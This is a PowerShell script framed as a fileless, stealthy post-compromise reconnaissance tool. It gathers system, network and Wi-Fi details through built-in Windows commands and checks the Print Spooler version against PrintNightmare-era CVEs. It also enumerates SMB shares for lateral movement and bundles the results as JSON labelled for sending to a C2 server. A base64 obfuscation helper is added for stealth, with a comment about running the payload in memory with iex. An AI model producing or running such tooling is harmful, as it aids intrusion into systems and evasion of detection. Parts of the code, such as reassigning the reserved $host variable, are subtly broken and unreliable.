# --- Fileless PowerShell Auto Discovery & Print Spooler CVE Scanner ---

# Section 1: Utility functions (fileless & in-memory)

function Invoke-Lolbin {
    param([string]$cmd)
    # Run native LOLBins commands silently, return output
    try {
        $output = & cmd /c $cmd 2>$null
        return $output
    } catch {
        return $null
    }
}

function Get-SpoolerVersion {
    try {
        $path = (Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Services\Spooler" -Name "ImagePath").ImagePath
        # Trim quotes & parameters if any
        $exe = $path -replace '"','' -split ' ' | Select-Object -First 1
        $ver = (Get-Command $exe).FileVersionInfo.FileVersion
        return $ver
    } catch {
        return $null
    }
}

# Section 2: Core discovery commands (all fileless)

# System info via LOLBin systeminfo
$sysInfo = Invoke-Lolbin "systeminfo"

# Network config & neighbors
$netInfo = Invoke-Lolbin "ipconfig /all"
$netNeighbors = Invoke-Lolbin "netsh wlan show networks mode=bssid"

# Print spooler service info
$spoolerService = Invoke-Lolbin "sc qc spooler"
$spoolerVersion = Get-SpoolerVersion

# Windows update history for print spooler-related patches
$printUpdatesRaw = Invoke-Lolbin "wmic qfe get HotFixID,Description,InstalledOn"
$printUpdates = ($printUpdatesRaw | Where-Object { $_ -match "Print" }) -join "`n"

# Section 3: Embedded CVE database for Print Spooler

$cvePrintSpooler = @(
    @{CVE="CVE-2021-34527";Version="10.0.19041.928";Score=8.8;Description="PrintNightmare Remote Code Execution"},
    @{CVE="CVE-2021-34481";Version="10.0.19041.906";Score=7.8;Description="Spooler Privilege Escalation"},
    @{CVE="CVE-2022-23277";Version="10.0.19041.1826";Score=7.8;Description="Spooler Privilege Escalation"}
)

# Section 4: Vulnerability check logic

$vulnerabilities = foreach ($cve in $cvePrintSpooler) {
    if ($spoolerVersion -and ([version]$spoolerVersion -lt [version]$cve.Version)) {
        [PSCustomObject]@{
            CVE = $cve.CVE
            Description = $cve.Description
            InstalledVersion = $spoolerVersion
            Vulnerable = $true
        }
    }
}

# Section 5: Lateral network enumeration (SMB shares + host discovery)

# Use native LOLBins like net view and PowerShell for SMB shares
$smbShares = Invoke-Lolbin "net view" | Where-Object { $_ -match "\\\\" }

# Optionally add SMB share enumeration with PowerShell (no disk footprint)
$sharesDetails = @()
foreach ($share in $smbShares) {
    $host = $share -replace '\\',''
    try {
        $sharesDetails += Get-SmbShare -CimSession $host -ErrorAction SilentlyContinue
    } catch {}
}

# Section 6: Compile report object and convert to JSON

$discoveryReport = [PSCustomObject]@{
    SystemInfo = $sysInfo
    NetworkInfo = $netInfo
    WifiNetworks = $netNeighbors
    SpoolerService = $spoolerService
    SpoolerVersion = $spoolerVersion
    PrintSpoolerVulnerabilities = $vulnerabilities
    InstalledPrintPatches = $printUpdates
    SMBSharesSummary = $smbShares
    SMBSharesDetails = $sharesDetails
}

$finalOutput = $discoveryReport | ConvertTo-Json -Depth 5

# Section 7: Output or send to C2
Write-Output $finalOutput


# ------------------------------
# Optional: Inline obfuscation function for stealth (example)
function Invoke-Obfuscate {
    param([string]$code)
    # Simple base64 encoding with wrapping, can be extended with custom encoding or token replacement
    $bytes = [System.Text.Encoding]::Unicode.GetBytes($code)
    $encoded = [Convert]::ToBase64String($bytes)
    $wrapped = "powershell -EncodedCommand $encoded"
    return $wrapped
}

# Usage: Invoke-Obfuscate -code (Get-Content .\thisscript.ps1 -Raw)
# Inject or run obfuscated payload in-memory with iex

